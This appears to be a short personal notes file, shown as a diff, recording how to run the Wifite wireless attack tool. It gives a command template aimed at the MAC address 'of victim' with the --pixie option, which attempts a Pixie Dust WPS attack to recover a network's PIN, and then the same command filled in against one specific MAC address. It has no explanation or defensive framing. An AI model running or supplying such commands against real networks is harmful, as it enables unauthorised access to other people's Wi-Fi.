@@ -1,0 +1,7 @@
+WIFITE
+wifite -b <MAC ADDRESS of victim> --quiet --pixie
+
+A0:63:91:D5:63:07 
+
+wifite -b A0:63:91:D5:63:07 --quiet --pixie
+
